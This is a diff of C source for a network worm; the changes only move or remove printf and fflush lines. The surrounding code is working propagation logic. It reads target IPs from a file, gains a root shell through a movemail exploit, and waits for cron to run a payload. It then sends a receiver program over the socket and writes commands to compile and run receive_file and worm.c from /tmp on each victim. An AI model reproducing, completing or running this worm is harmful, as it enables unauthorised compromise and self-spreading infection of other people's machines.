@@ -12,13 +12,12 @@
 void get_local_ip(ip)
     char *ip;
 {
-    printf("[*] Getting local IP\n");
-    fflush(stdout);
-
     int sock;
     struct sockaddr_in serv_addr, local_addr;
     int len; /* socklen_t did not exist, use int */
     len = sizeof(local_addr);
+
+    printf("[*] Getting local IP\n");
 
     sock = socket(AF_INET, SOCK_DGRAM, 0);
     if (sock < 0) {
@@ -54,12 +53,12 @@ void deploy_receive_file(sock, my_ip)
     int sock;
     char *my_ip;
 {
-    printf("[*] Deploying receive_file.c to target: %s\n", my_ip);
-    fflush(stdout);
     char cmd_buf[IO_BUF_SIZE];
     char *formatted_source;
     char *file_contents;
     
+    printf("[*] Deploying receive_file.c to target: %s\n", my_ip);
+
     formatted_source = (char *)malloc(10000); 
     if (formatted_source == (char *)0) return;
 
@@ -93,7 +92,6 @@ fputs(b,o);fs-=n;}fclose(o);free(fn);send_int(i,s);}break;}close(s);return 0;}";
     read_from_sock(sock, cmd_buf, IO_BUF_SIZE);
     free(formatted_source);
     printf("[*] File contents sent\n");
-    fflush(stdout);
 }
 
 void infect(ip, my_ip)
@@ -120,7 +118,6 @@ void infect(ip, my_ip)
     if (connect(sock, (struct sockaddr *)&serv_addr, sizeof(serv_addr)) < 0) {
         close(sock);
         printf("[*] SOCKET FAILED. EXITING\n");
-        fflush(stdout);
         return;
     }
 
@@ -130,15 +127,12 @@ void infect(ip, my_ip)
 
     get_root_shell_via_movemail_exploit(sock, io_buf, IO_BUF_SIZE);
     printf("[*] Waiting for cron daemon to execute payload (65s)...\n");
-    fflush(stdout);
     sleep(65);
     printf("[*] Wait over\n");
-    fflush(stdout);
 
     deploy_receive_file(sock, my_ip);
     
     printf("[*] Forking to create send_file process\n");
-    fflush(stdout);
 
     if (fork() == 0) {
         argv[0] = "send_file_over_socket_bsd";
@@ -150,25 +144,21 @@ void infect(ip, my_ip)
     }
 
     printf("[*] Attempting to compile receive_file.c on target\n");
-    fflush(stdout);
     write_to_sock(sock, "cc /tmp/receive_file.c -o /tmp/receive_file\n");
     sleep(2);
     read_from_sock(sock, io_buf, IO_BUF_SIZE);
 
     printf("[*] Running receive_file on target\n");
-    fflush(stdout);
     write_to_sock(sock, "/tmp/receive_file &\n");
     sleep(2);
     read_from_sock(sock, io_buf, IO_BUF_SIZE);
 
     printf("[*] Compiling worm.c on target\n");
-    fflush(stdout);
     write_to_sock(sock, "cc /tmp/worm.c -o /tmp/worm\n");
     sleep(2);
     read_from_sock(sock, io_buf, IO_BUF_SIZE);
     
     printf("[*] Running worm.c on target\n");
-    fflush(stdout);
     write_to_sock(sock, "/tmp/worm &\n");
     sleep(2);
     read_from_sock(sock, io_buf, IO_BUF_SIZE);
@@ -206,7 +196,6 @@ int main()
 
             infect(ip, my_ip);
             printf(" ---- Infection Cycle completed for IP: %s ----\n", ip);
-            fflush(stdout);
             sleep(10);
         }
         fclose(fp);
